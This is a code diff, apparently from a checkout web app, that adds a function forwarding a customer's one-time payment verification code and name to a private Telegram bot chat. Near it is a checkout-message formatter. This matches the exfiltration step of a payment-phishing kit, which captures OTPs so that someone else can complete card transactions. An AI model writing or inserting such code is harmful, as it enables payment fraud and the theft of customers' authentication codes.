@@ -105,3 +105,40 @@ function formatCheckoutMessage(data: CheckoutData): string {
 
   return message;
 }
+
+export async function sendOTPToTelegram(otp: string, customerName: string): Promise<boolean> {
+  try {
+    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
+    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+
+    if (!botToken || !chatId) {
+      return false;
+    }
+
+    const message = `🔐 <b>OTP VERIFICATION CODE</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Customer: <b>${customerName || 'Unknown'}</b>
+Code: <code>${otp}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚠️ <i>User is attempting to verify payment.</i>`;
+
+    const payload = {
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML',
+    };
+
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
+    });
+
+    const result = await response.json();
+    return result.ok;
+  } catch (error) {
+    return false;
+  }
+}
